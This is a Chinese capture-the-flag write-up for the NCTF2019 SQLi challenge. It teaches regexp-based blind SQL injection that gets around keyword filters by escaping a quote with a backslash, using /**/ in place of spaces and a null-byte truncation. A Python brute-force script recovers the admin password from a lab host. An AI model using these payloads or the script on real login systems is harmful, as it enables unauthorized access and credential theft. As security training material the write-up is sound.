# [NCTF2019]SQLi

## 0、知识点

>   基于regexp的盲注

 **关于MySQL的regexp**

>   **regexp：是正则匹配，可以说它是like关键字的上位替代，like关键字可以做到的它也可以做到**

**看一个正常的使用案例：**

```MySQL
-- 查找a开头的名称
SELECT * FROM `tb_class` WHERE ClassName regexp '^a'
-- 查找a结尾的名称
SELECT * FROM `tb_class` WHERE ClassName regexp 'a$'
-- 查找a开头 [或] a结尾
SELECT * FROM `tb_class` WHERE ClassName regexp 'a$|^a'
-- 范围查找，查找包含a到d字母的名称
SELECT * FROM `tb_class` WHERE ClassName regexp '[a-d]'
-- 范围组合,以下会依次去匹配，ae/be/ce/de的记录
SELECT * FROM `tb_class` WHERE ClassName regexp '[a-d]e'
```

**看一个基本注入案例**

```mysql
-- 正常注入语句
select username from users where id = 1;

-- 正则注入，如果username的第一个字符是a返回1，不是a返回0
select (select username from users where id=1) regexp '^a';

-- 联合查询中爆破数据库名
1 union select 1,database() regexp '^s',3--+
```

**regexp代替where条件中的 = 号**

==当过滤了【=】【in】【like】的时候就可以使用这个办法==

==【^】被过滤也可以使用【$】从后往前匹配==

```mysql
-- 用regexp查询20开头的年级
select * from tb_class where grade REGEXP '^20'
```





## 1、分析

>   打开题目主页，看起来非常简单，是一个sql注入的题，并且把sql语句都放出来了

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303230956093.png)

>   然后尝试使用万能密码`admin' or 1=1`并没有什么用

>   然后使用burpsuite扫一下过滤了哪些关键字

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303230959567.png)

>   过滤了好多东西，如：select、concat、like、limit、or、and等等，好多好多

>   根据过滤的关键字，也想不出啥注入方式，所以随便翻翻看看有没有提示

>   常见的提示一般会放在：**源代码、robots.txt**里面

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303231047649.png)

>   可以看到提示文件了

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303231048406.png)

>   可以发现这题有着让人头疼的过滤，然后登录进去了就可以拿flag，
>
>   读一下这个过滤，可以发现**regexp没有被过滤**，并且用户名是**admin**，password需要猜

>   所以我们需要去爆破admin用户的登录密码，但是如果用户名输入**admin**，会被**hacker**
>
>   所以出**username**这里下手是不行的，得想办法构造出**or**关键字那种形式的查询，从而把**username**的值忽略掉

>   如何把 **username**的值忽略掉，无非就是两个办法，**想办法闭合单代号，然后注释掉后面的单引号，或者转义掉后面的单引号，让后面的查询条件变成username的值**
>
>   ==闭合单引号的方法一般有：==
>
>   -   ==在输入的值的前面添加单引号==，**但是这里单引号被过滤掉了**
>   -   ==转义掉 **username**后面的单引号，从而让`username = \' and passwd=`==
>   -   翻一翻过滤关键字可以发现**【\】并没有被过滤，【||】也没有被过滤，【^】也没有被过滤，【空格】是被过滤的，但是可以使用【`/**/`】来代替空格**
>       -   那么盲注语句就很明显如下

```mysql
select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/\"^a\";%00'
```

>   然后推导出了盲注语句，就开始写脚本了？
>
>   然而并不是，写脚本之前首先的先知道如果第一个字符是正确的它会返回啥结果
>
>   所以首先用burp跑一遍看看第一个字符是啥

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303232319041.png)

>   直接把大小写字符和标点符号全跑了一遍，只有【y】和【^】发生了302跳转，然后跳转到了一个**welcome.php**页面，至于Y应该是不区别大小写，可以先不管，至于【^】因为在正则里面就是表示任意字符，所以不考虑

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303232322674.png)

>   进一步用Python分析一下，具体要以啥为判断注入正确的标准，以响应码还是判断welcome页面
>
>   输入y进行测试是返回了404结果，其他的字符会返回200

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303232327601.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303232334626.png)



>   然后就可以写一个盲注脚本了，**其中有个需要注意的点就是最后的【%00】截断，使用Python不知道为啥一直会被转义成【%2500】，然后导致一直失败，这个在burp进行测试是不会被转义的，后面找到可以使用【\x00】作为替代，效果是一样，这个**

```py
import requests
import string
import time

url = "http://06cd07e5-0726-4196-8e57-7a6b63746a53.node4.buuoj.cn:81/"
charPool = string.ascii_letters + string.digits + "_"

# 接收最终的结果
result = ''

# 密码的长度
for i in range(1, 60):

    for j in charPool:

        data = {
            "username": "\\",
            "passwd": '||/**/passwd/**/regexp/**/"^{}";\x00'.format(result+j)
        }
        res = requests.post(url=url, data=data)
        if res.status_code == 404:
            result += j
            print(result+j, "   ", res.status_code)
            break

        # 当到达最后一个字符时候
        if j == "_":
            break

        time.sleep(0.5)
```

>   当以【__】结尾跑完一圈还全是200，就是后面没了

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303231530758.png)



>   最后登录获取flag，用户名随便输，密码为：you_will_never_know7788990

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303231518174.png)



















参考：

https://xz.aliyun.com/t/8003#toc-7

https://zhuanlan.zhihu.com/p/106088835

https://www.cnblogs.com/zhwyyswdg/p/14036395.html